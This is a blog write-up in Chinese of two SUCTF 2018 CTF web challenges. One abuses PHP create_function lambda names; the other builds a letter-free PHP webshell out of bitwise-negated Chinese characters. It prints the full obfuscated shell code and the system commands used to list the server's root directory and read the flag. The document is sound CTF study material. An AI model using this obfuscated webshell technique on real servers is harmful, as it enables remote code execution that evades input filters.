---
title: SUCTF 2018 部分web writeup
tags: 
  - ctf
date: 2018-05-28 10:46:06
---

# SUCTF
抽了点时间做了2道SUCTF的web题，记录一下writeup。

<!-- more -->
# Anonymous

## 考点
php的动态函数执行，以及create_function所返回的匿名函数

## wp
访问题目，直接给了源码
```
$MY = create_function("","some code"); // 执行了cat命令，读取flag内容
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function 'SUCTF_'.$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
```
思路比较明确，就是想办法执行create_function所产生的匿名函数。
而其中SUCTF_32，这个函数明确是没办法爆破出来的。那么就只能在 `$MY` 上下功夫。
打印一下`$MY`的值，发现create_function返回了`\0lambda_{number}`,那么就很明确了，只要暴力一下这个number就有一定几率执行该函数，这里我暴力了大概1000多就有2条执行了


# Getshell

## 考点

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

## wp

1. 首先确定可用字符，使用bp将所有可见字符暴力一遍后发现可打印字符为`$ () [] _ ~ . ; =`，以及其他不可打印字符。
2. 根据p牛的博客，发现取反中文可以起到作用，测试`~({中文})`发现可根据中文的utf-8编码的中间2个hex码进行对字母的遍历
http://www.herongyang.com/gb2312_gb/pinyin_32.html
3. 凑出字符`assert`，`_GET`，并动态执行。
为了凑出上面的字符，我采用逐个反取反`bin2hex(~('a'))`获得中文utf-8编码的中间2个，搜表即可找到对应的中文，写一下我的getshell代码
```
<?php
$_=~(瞎);
$__.=$_[[]==[]];
$_=~(挟);
$__.=$_[[]==[]];
$_=~(挟);
$__.=$_[[]==[]];
$_=~(隙);
$__.=$_[[]==[]];
$_=~(卸);
$__.=$_[[]==[]];
$_=~(勋);
$__.=$_[[]==[]];

$_=~(校);
$___.=$_[[]==[]];
$_=~(下);
$___.=$_[[]==[]];
$_=~(纤);
$___.=$_[[]==[]];
$_=~(嫌);
$___.=$_[[]==[]];
$___=$$___;
$__($___[_]);
```
4. 上传了shell之后就比较容易了，翻目录即可
```
system('ls /')
system('cat /Th1s_14_f14g')
```

# 总结
记录一下getshell的坑点
  1. eval不是函数，是语句
  2. 不用引号，用中文也被php当作是字符串
  3. UTF-8编码 http://www.herongyang.com/gb2312_gb/pinyin_32.html